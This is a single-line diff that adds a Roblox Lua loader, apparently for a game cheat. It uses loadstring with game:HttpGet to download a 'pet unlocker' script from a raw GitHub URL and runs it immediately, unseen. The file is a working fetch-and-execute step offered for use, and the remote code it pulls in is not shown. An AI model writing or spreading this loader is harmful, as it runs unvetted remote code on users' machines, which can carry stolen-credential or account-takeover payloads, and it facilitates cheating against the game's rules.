@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1wole/pet-unlocker-psx/main/PET%20CHANGER", true))()
